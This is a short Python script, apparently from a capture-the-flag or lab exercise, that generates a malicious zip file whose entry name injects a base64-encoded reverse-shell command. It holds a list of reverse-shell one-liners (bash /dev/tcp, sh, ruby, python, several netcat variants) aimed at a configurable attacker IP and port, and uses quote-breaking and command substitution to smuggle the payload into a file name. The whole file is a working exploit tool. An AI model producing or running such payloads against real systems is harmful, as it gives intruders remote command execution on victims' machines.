import base64
import zipfile as zp 

ip_address = '127.0.0.1' # currently on localhost, change depending on VPN server
port = '1337'

# bash reverse shell
rs = "/bin/bash -i 1>& /dev/tcp/" + ip_address + "/" + port + " 0>&1"

# sh reverse shell
# rs = "sh -i >& /dev/tcp/" + ip_address + "/" + port + " 0>&1"

# ruby reverse shell
# rs = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + \
#      ip_address + "\",\"" + port + \
#      "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end';"

# python reverse shell
# rs = "python -c 'import socket,subprocess,os;" + \
#      "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + \
#      "\"" + ip_address + "\"," + port + "));os.dup2(s.fileno(),0); " + \
#      "os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);" + \
#      "p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

# # netcat traditional reverse shell (sh)
# rs = "nc -e /bin/sh " + ip_address + " " + port

# # netcat traditional reverse shell (bash)
# rs = "nc -e /bin/bash " + ip_address + " " + port

# # netcat traditional reverse shell (bash 2)
# rs = "nc -c bash " + ip_address + " " + port

# netcat OpenBsd reverse shell
# rs = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
#      ip_address + " " + port + " >/tmp/f"

xargs_cmd = "xargs -I -t sh -c"

encoded_rs = str(base64.b64encode(rs.encode('utf-8')), 'utf-8')
decode_cmd = "echo -n '" + encoded_rs + "' | base64 -d"
argument = "$(" + decode_cmd + ")"

# filename = "'; " + rs + "; 'foo.png"
filename = "'; " + xargs_cmd + " " + argument + "; 'foo.png"

with zp.ZipFile('payloads/rce.zip', 'w') as z:
    z.writestr(filename, 'poop')
